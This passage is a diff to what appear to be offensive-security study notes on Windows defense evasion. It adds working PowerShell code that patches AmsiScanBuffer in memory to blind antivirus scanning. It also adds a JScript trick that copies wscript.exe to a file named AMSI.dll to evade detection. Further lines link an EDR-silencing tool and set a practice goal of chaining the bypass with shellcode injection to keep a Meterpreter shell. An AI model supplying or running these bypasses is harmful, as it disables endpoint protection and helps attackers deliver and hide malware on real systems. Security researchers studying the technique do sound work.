@@ -150,15 +150,70 @@ $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer) # change 0x40 = PAGE_E
 $buf = [Byte[]] (0x48, 0x31, 0xC0) 
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3) # copy the assembly
 ```
+### Patching `amsiScanBuffer`
+With the following PowerShell code snippet, we can then load `amsi.dll`, get the address of `AmsiScanBuffer` and overwrite the beginning with our shellcode.
+
+```powershell
+# Calling Win32 APIs from PowerShell
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public static class Kernel32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string lpLibFileName);
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@;
+$patch = [Byte[]] (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3);
+$hModule = [Kernel32]::LoadLibrary("amsi.dll"); # Load the "amsi.dll" using LoadLibrary Win32 API
+$lpAddress = [Kernel32]::GetProcAddress($hModule, "Amsi"+"ScanBuffer");
+$lpflOldProtect = 0;
+[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$lpflOldProtect) | Out-Null;
+$marshal = [System.Runtime.InteropServices.Marshal];
+$marshal::Copy($patch, 0, $lpAddress, $patch.Length);
+[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null;
+```
+# 7.6 Bypassing AMSI in JScript
+References & Credit: 
+- HIP2019-Dominic_Chell-Cracking_The Perimeter With Sharpshooter by @Tal_Liberman
+- [Tyranid's Lair: Disabling AMSI in JScript with One Simple Trick](https://www.tiraniddo.dev/2018/06/disabling-amsi-in-jscript-with-one.html)
+-  Salute to [tyranid](https://www.tiraniddo.dev/)  for this technique and the author of "DotNetToJScript" 
+- The attack "[DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001/) "  sub technique of "Hijack Execution Flow" 
+
+Use frida-trace to live debug the *DotNetToJscript* technique. The WinDefender (AMSI) is able to detect, and flag it's malicious
+Please read "tyranid's" article carefully. He suggests renaming **WSCRIPT.EXE** to **AMSI.DLL** and executing it.
+
+```js
+var filesys= new ActiveXObject("Scripting.FileSystemObject");
+var sh = new ActiveXObject('WScript.Shell');
+try
+{ 
+	if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
+	{ 
+		throw new Error(1, '');
+	} 
+} 
+catch(e)
+{ 
+	filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
+	sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}" + WScript.ScriptFullName);
+	WScript.Quit(1);
+}
+```
+
+**Practice**: the AMSI bypass + Shellcode runner + Process injection and migration to obtain the Meterpreter shell that stays alive after the detection.
+
+# Conclusion & TODO
+Introduction to WinDefender - the Anti-Malware Scan Interface (AMSI) 
+AMSI bypass in PowerShell and JScript
 
 
-
-
-
-
-
-
-
+Defense Evasion Technique: Endpoint Detection and Response (EDR) and Extended Detection and Response (XDR)
+https://github.com/reveng007/Learning-EDR-and-EDR_Evasion
+[EDRSilencer](https://github.com/netero1010/EDRSilencer) A tool uses Windows Filtering Platform (WFP) to block Endpoint Detection and Response (EDR) agents from reporting security events to the server.
 
 
 
